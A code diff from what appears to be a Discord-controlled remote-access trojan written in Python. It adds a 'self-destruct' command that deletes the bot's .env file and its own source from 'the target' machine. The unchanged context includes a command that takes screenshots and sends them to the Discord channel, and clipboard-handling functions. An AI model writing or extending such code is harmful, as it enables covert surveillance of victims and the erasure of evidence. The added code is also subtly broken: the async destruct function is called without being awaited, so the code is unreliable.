@@ -33,6 +33,7 @@ elif system() == "Linux":
 else:
     exit()
 
+
 class MyBot(commands.Bot):
     async def setup_hook(self):
         # self is the bot here
@@ -49,7 +50,6 @@ class MyBot(commands.Bot):
 
         for cog_class in cog_classes:
             await self.add_cog(cog_class(bot))
-        
 
 
 bot = MyBot(command_prefix=["!","! "], intents=intents, help_command=None)
@@ -271,6 +271,25 @@ async def screenshot(ctx):
     image_path = take_screenshot()
     await ctx.send(file=discord.File(image_path))
 
+
+# Self-Destruct functions
+    
+async def destruct():
+    os.remove(".env")
+    os.remove(__file__)
+
+@bot.command(name="self-destruct")
+async def destruct_command(ctx):
+    confirm = confirm_action(action_description="**Are you sure you want to self-destruct? **THIS WILL DELETE THE PROGRAM FROM THE TARGET, AN ACTION THAT CANNOT BE UNDONE**")
+
+    if confirm:
+        embed = embed_data(title="Self-destruct", description="Self-destruction started", color=discord.Color.red())
+        await ctx.send(embed=embed)
+
+        destruct()
+    else:
+        embed = embed_data(title="Self-destruct", description="Self destruction was cancelled")
+        await ctx.send(embed=embed)
 
 # Clipboard functions
     
